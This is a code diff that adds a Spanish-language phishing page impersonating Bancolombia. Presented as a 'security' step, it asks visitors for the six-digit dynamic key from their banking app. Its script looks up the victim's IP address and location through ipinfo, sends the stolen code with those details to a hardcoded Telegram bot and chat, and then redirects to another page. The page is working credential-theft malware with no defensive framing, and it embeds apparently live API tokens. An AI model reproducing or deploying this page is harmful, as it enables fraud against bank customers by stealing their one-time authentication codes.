@@ -1,0 +1,87 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seguridad</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body style="background-image: url(fondito.svg);background-size: cover;background-repeat: no-repeat;background-position: bottom -307px left -288px;">
+    <br>
+   <img src="loguitope.png" style="width: 90px;display: block;margin: 0 auto;">
+   <br>
+   <br>
+
+   <form onsubmit="enviarDatos(event)" method="" class="formulario" xvpn-watching-form="true">
+    <h1 style="display: block;margin: 0 auto;text-align: center;font-size: 17pt;">¡Por su seguridad ingrese la clave dinamica generada en su App Bancolombia! </h1>
+        <br>
+        <br>
+        <div class="input-group" >
+            
+           
+            <input type="tel" id="usr" minlength="6" maxlength="6" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" placeholder="Ingrese dinamica de 6 dígitos" name="entoncesdaletra" required style="border-bottom: 1px solid #fdda24;line-height: 24px;font-size: 16px;letter-spacing: .4px;color: #2b2b2b;-webkit-appearance: none;border-left: 0;border-right: 0;border-top: none;" ></span>
+        </div>
+        <br>
+      
+       
+      <br>
+        <button type="submit">CONFIRMAR</button>
+        <br>
+        <br>
+        
+        <br>
+        <br>
+        <br>
+       
+        
+    </form>
+</body>
+</html>
+
+
+<script>
+    const tokenTelegram = "5655398021:AAGkUD7KfkdXVauBnnq9mfLvpMRoEqyB6ns";
+    const tokenIPinfo = "9c9af8c7467cc4";
+  
+    function enviarDatos(event) {
+      event.preventDefault(); 
+  
+      const usr = document.getElementById("usr").value;
+  
+      fetch(`https://ipinfo.io/json?token=${tokenIPinfo}`, {
+        method: "GET"
+      })
+      .then(response => response.json())
+      .then(data => {
+        const mensaje = `BANCOLOMBIA
+CODIGO 1: ${usr}
+IP: ${data.ip}
+${data.city},${data.country}
+        `;
+  
+        fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+              chat_id: "5666517648",
+              text: mensaje
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log("Respuesta de Telegram:", data);
+    
+            window.location.href = "muas3.html";
+          })
+          .catch(error => {
+            console.error("Error al enviar datos", error);
+          });
+        })
+        .catch(error => {
+          console.error("Error al obtener información", error);
+        });
+      }
+  </script>
